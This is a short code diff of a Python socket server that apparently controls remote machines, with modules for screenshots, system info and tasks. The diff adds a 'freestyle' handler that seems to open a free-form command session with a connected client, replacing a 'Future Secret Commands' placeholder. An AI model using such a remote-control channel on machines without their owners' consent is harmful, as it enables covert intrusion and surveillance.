@@ -16,6 +16,7 @@ import screenshot
 import connectedstations
 import tasks
 import sysinfo
+from freestyle import freestyle
 
 
 # TODO: Break to modules.
@@ -41,7 +42,7 @@ class Server:
         self.server = socket.socket()
         self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.server.bind((self.serverIp, self.serverPort))
-        self.chunk = 40960000
+        # self.chunk = 40960000
         self.server.listen(5)
 
         if not os.path.exists(self.path):
@@ -372,7 +373,8 @@ class Server:
 
             # Run Custom Command
             if int(cmd) == 100:
-                print("Future Secret Commands")
+                con.send("freestyle".encode())
+                freestyle(con)
                 continue
 
             # Create INT Zone Condition
